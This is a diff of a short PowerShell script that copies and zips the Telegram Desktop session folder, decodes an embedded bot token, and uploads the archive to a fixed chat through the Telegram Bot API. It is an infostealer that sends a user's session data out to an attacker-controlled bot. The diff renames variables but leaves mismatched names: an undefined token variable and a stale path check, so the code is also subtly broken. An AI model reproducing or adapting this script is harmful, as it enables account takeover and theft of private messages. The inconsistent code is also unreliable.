@@ -1,9 +1,9 @@
-$source = "$env:APPDATA\Telegram Desktop\tdata"
+$src = "$env:APPDATA\Telegram Desktop\tdata"
 $zip = "$env:TEMP\tdata.zip"
 $tent = "Nzk5Mzc1NTI1OTpBQUhQRUZSTFY1dmY1T1lvQnNRQjVlbnJSaXpSbC1hNFZKRQo="
 $tentet = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedToken))
 $cht = "5047177665"
 
 if (-not (Test-Path $source)) { exit 1 }
-Compress-Archive -Path $source\* -DestinationPath $zip -Force
-Invoke-RestMethod -Uri "https://api.telegram.org/bot$tentet/sendDocument" -Method Post -Form @{ chat_id = $chat; document = Get-Item $zip }
+Compress-Archive -Path $src\* -DestinationPath $zip -Force
+Invoke-RestMethod -Uri "https://api.telegram.org/bot$tentet/sendDocument" -Method Post -Form @{ chat_id = $cht; document = Get-Item $zip }
